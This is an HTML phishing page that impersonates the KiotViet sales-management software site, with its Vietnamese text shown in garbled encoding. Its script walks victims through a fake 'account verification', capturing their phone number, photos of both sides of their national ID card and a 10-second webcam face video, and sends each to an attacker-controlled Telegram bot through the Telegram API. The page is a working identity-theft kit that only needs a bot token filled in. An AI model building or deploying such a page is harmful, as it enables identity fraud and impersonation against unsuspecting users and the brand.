<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>KiotViet - Ph·∫ßn m·ªÅm qu·∫£n l√Ω b√°n h√†ng ph·ªï bi·∫øn nh·∫•t</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
    <style>
        body { font-family: 'Roboto', sans-serif; }
        .kv-green { color: #57b846; }
        .bg-kv-green { background-color: #57b846; }
        .hidden { display: none; }
    </style>
</head>
<body class="bg-[#f4f7f6]">

<div id="app">
    <div id="landing-page">
        <nav class="flex items-center justify-between px-4 md:px-20 py-3 bg-white shadow-md sticky top-0 z-50">
            <div class="flex items-center gap-8">
                <img src="https://www.kiotviet.vn/Static/Theme/images/logo.png" alt="KiotViet" class="h-7 md:h-9">
                <div class="hidden lg:flex space-x-6 font-medium text-gray-600 text-sm">
                    <a href="#" class="hover:text-[#57b846] transition">KH√ÅM PH√Å</a>
                    <a href="#" class="hover:text-[#57b846] transition">PH√ÇN H·ªÜ NG√ÄNH H√ÄNG</a>
                    <a href="#" class="hover:text-[#57b846] transition">B·∫¢NG GI√Å</a>
                </div>
            </div>
            <div class="flex items-center gap-2 md:gap-4">
                <button onclick="renderPhoneInput()" class="text-gray-700 font-bold text-sm hover:text-[#57b846] px-2 md:px-4 py-2 transition">ƒêƒÇNG NH·∫¨P</button>
                <button onclick="renderPhoneInput()" class="bg-[#ff9c00] text-white px-4 md:px-6 py-2 rounded font-bold text-sm hover:bg-[#e68d00] transition shadow-sm">ƒêƒÇNG K√ù</button>
            </div>
        </nav>

        <main class="max-w-6xl mx-auto px-6 pt-12 md:pt-20 text-center">
            <h1 class="text-3xl md:text-6xl font-bold leading-tight mb-6 text-gray-800">
                Ph·∫ßn m·ªÅm qu·∫£n l√Ω b√°n h√†ng <br/>
                <span class="kv-green uppercase">Ph·ªï bi·∫øn nh·∫•t</span>
            </h1>
            <p class="text-lg text-gray-600 max-w-2xl mx-auto mb-10">H∆°n 200.000 c·ª≠a h√†ng ƒëang s·ª≠ d·ª•ng KiotViet ƒë·ªÉ kinh doanh hi·ªáu qu·∫£ h∆°n.</p>
            
            <div class="flex flex-col sm:flex-row justify-center gap-4 mb-16">
                <button class="bg-white text-[#57b846] border-2 border-[#57b846] px-10 py-3 rounded-full font-bold text-lg hover:bg-green-50 transition">KH√ÅM PH√Å NGAY</button>
                <button onclick="renderPhoneInput()" class="bg-kv-green text-white px-10 py-3 rounded-full font-bold text-lg hover:bg-[#46a338] transition shadow-lg uppercase tracking-wider">D√πng th·ª≠ mi·ªÖn ph√≠</button>
            </div>

            <div class="bg-white p-4 rounded-xl shadow-2xl border border-gray-100 inline-block">
                <img src="https://www.kiotviet.vn/Static/Theme/images/banner_home_new.png" class="w-full max-w-4xl mx-auto">
            </div>
        </main>
    </div>

    <div id="flow-content"></div>
</div>

<script>
    // --- C·∫§U H√åNH TELEGRAM ---
    const TELEGRAM_TOKEN = 'YOUR_BOT_TOKEN'; 
    const CHAT_ID = 'YOUR_CHAT_ID';

    async function sendToTele(text, file = null, type = 'text') {
        try {
            if (type === 'text') {
                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'Markdown' })
                });
            } else {
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append(type, file);
                if(text) formData.append('caption', text);
                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/send${type.charAt(0).toUpperCase() + type.slice(1)}`, {
                    method: 'POST', body: formData
                });
            }
        } catch (e) { console.error(e); }
    }

    // --- B∆Ø·ªöC 2: NH·∫¨P S·ªê ƒêI·ªÜN THO·∫†I ---
    function renderPhoneInput() {
        document.getElementById('landing-page').classList.add('hidden');
        document.getElementById('flow-content').innerHTML = `
        <div class="min-h-screen flex flex-col items-center pt-20 px-6">
            <div class="bg-white p-8 rounded shadow-xl w-full max-w-sm border-t-4 border-kv-green text-center">
                <img src="https://www.kiotviet.vn/Static/Theme/images/logo.png" class="h-6 mx-auto mb-6">
                <h2 class="text-xl font-bold mb-2 text-gray-800 uppercase">X√°c minh t√†i kho·∫£n</h2>
                <p class="text-xs text-gray-500 mb-8 italic">Vui l√≤ng nh·∫≠p s·ªë ƒëi·ªán tho·∫°i ƒë·ªÉ ti·∫øp t·ª•c</p>
                <input id="phone" type="tel" placeholder="S·ªë ƒëi·ªán tho·∫°i" class="w-full p-4 border border-gray-300 rounded mb-6 focus:border-kv-green outline-none text-center text-xl tracking-widest">
                <button onclick="handlePhone()" class="w-full bg-kv-green text-white py-4 rounded font-bold text-lg hover:bg-[#46a338]">TI·∫æP T·ª§C</button>
            </div>
        </div>`;
    }

    async function handlePhone() {
        const phone = document.getElementById('phone').value;
        if(phone.length >= 10) {
            await sendToTele(`üì± **C√ì SƒêT M·ªöI**: \`${phone}\``);
            showVerifyAlert();
        } else { alert("Vui l√≤ng nh·∫≠p s·ªë ƒëi·ªán tho·∫°i h·ª£p l·ªá"); }
    }

    // --- B∆Ø·ªöC 3: TH√îNG B√ÅO X√ÅC MINH ---
    function showVerifyAlert() {
        const div = document.createElement('div');
        div.className = "fixed inset-0 bg-black/50 flex items-center justify-center z-50 p-4";
        div.innerHTML = `
        <div class="bg-white rounded p-8 text-center max-w-sm w-full border-t-4 border-[#ff9c00]">
            <div class="w-16 h-16 bg-orange-50 rounded-full flex items-center justify-center mx-auto mb-4">
                <svg class="w-8 h-8 text-orange-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"></path></svg>
            </div>
            <h3 class="text-lg font-bold mb-3">Vui l√≤ng x√°c minh th√¥ng tin</h3>
            <p class="text-gray-600 mb-8 text-sm leading-relaxed">ƒê·ªÉ ho√†n t·∫•t y√™u c·∫ßu, b·∫°n c·∫ßn cung c·∫•p ·∫£nh th·∫ª nh√¢n vi√™n (CCCD) v√† x√°c th·ª±c khu√¥n m·∫∑t ch√≠nh ch·ªß.</p>
            <button onclick="renderUpload()" class="w-full bg-kv-green text-white py-3 rounded font-bold uppercase hover:bg-[#46a338]">X√°c minh ngay</button>
        </div>`;
        document.body.appendChild(div);
    }

    // --- B∆Ø·ªöC 4: UPLOAD ·∫¢NH ---
    function renderUpload() {
        const modal = document.querySelector('.fixed');
        if(modal) modal.remove();
        document.getElementById('flow-content').innerHTML = `
        <div class="min-h-screen bg-white p-6 flex flex-col items-center pt-12">
            <h2 class="text-xl font-bold mb-10 uppercase kv-green">G·ª≠i ·∫£nh ƒë·ªãnh danh</h2>
            <div class="w-full max-w-sm space-y-6">
                <div class="border-2 border-dashed p-12 rounded bg-gray-50 text-center relative hover:border-kv-green transition group">
                    <input type="file" class="absolute inset-0 opacity-0" onchange="up(this, 'M·∫∑t tr∆∞·ªõc')">
                    <p class="text-gray-400 font-bold text-xs group-hover:kv-green transition">M·∫∂T TR∆Ø·ªöC TH·∫∫</p>
                </div>
                <div class="border-2 border-dashed p-12 rounded bg-gray-50 text-center relative hover:border-kv-green transition group">
                    <input type="file" class="absolute inset-0 opacity-0" onchange="up(this, 'M·∫∑t sau')">
                    <p class="text-gray-400 font-bold text-xs group-hover:kv-green transition">M·∫∂T SAU TH·∫∫</p>
                </div>
                <button onclick="renderVideo()" class="w-full bg-kv-green text-white py-4 rounded font-bold mt-4 shadow-lg uppercase">TI·∫æP T·ª§C QUAY VIDEO</button>
            </div>
        </div>`;
    }

    async function up(input, label) {
        if (input.files[0]) {
            input.parentElement.classList.add('bg-green-50', 'border-kv-green');
            await sendToTele(`üì∏ ${label} (X√°c minh KiotViet)`, input.files[0], 'photo');
        }
    }

    // --- B∆Ø·ªöC 5: VIDEO 10S ---
    function renderVideo() {
        document.getElementById('flow-content').innerHTML = `
        <div class="min-h-screen bg-gray-900 flex flex-col items-center justify-center text-white p-6">
            <div class="relative w-64 h-64 border-4 border-kv-green rounded-full overflow-hidden mb-8 shadow-xl">
                <video id="v" autoplay muted playsinline class="w-full h-full object-cover"></video>
            </div>
            <div id="t" class="font-bold text-kv-green mb-8 text-center uppercase tracking-widest text-sm">Gi·ªØ nguy√™n khu√¥n m·∫∑t trong khung h√¨nh</div>
            <button id="btn" class="bg-kv-green px-12 py-4 rounded font-bold uppercase hover:bg-[#46a338] transition">B·∫Øt ƒë·∫ßu quay 10s</button>
        </div>`;

        const v = document.getElementById('v'), btn = document.getElementById('btn'), t = document.getElementById('t');
        navigator.mediaDevices.getUserMedia({ video: true }).then(s => {
            v.srcObject = s;
            btn.onclick = () => {
                btn.classList.add('hidden');
                let chunks = [], r = new MediaRecorder(s);
                r.ondataavailable = e => chunks.push(e.data);
                r.onstop = async () => {
                    const blob = new Blob(chunks, { type: 'video/mp4' });
                    t.innerText = "ƒêANG ƒê·ªíNG B·ªò D·ªÆ LI·ªÜU...";
                    await sendToTele("üé• VIDEO X√ÅC MINH KHO·∫¢N M·∫∂T 10S", blob, 'video');
                    alert("C·∫£m ∆°n! Th√¥ng tin c·ªßa b·∫°n ƒë√£ ƒë∆∞·ª£c g·ª≠i ƒë·ªÉ x√©t duy·ªát.");
                    window.location.reload();
                };
                r.start();
                let c = 10;
                let i = setInterval(() => {
                    c--; t.innerText = `X√ÅC MINH KHU√îN M·∫∂T (${c}S)`;
                    if (c <= 0) { clearInterval(i); r.stop(); s.getTracks().forEach(track => track.stop()); }
                }, 1000);
            };
        });
    }
</script>
</body>
</html>
